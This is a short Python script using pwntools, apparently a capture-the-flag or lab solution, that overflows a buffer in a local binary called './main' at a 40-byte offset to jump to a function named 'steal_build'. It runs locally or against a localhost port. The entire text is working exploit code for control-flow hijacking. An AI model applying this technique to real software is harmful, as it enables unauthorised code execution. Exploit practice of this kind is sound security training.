#!/usr/bin/env python3
from pwn import *

context.log_level = "error"
elf = context.binary = ELF("./main", checksec=False)

io = process("./main") if args.LOCAL else remote("127.0.0.1", 9018)
payload = flat({40: elf.sym["steal_build"]})
io.sendlineafter(b"escape route:\n", payload)
print(io.recvall().decode().strip())
io.close()
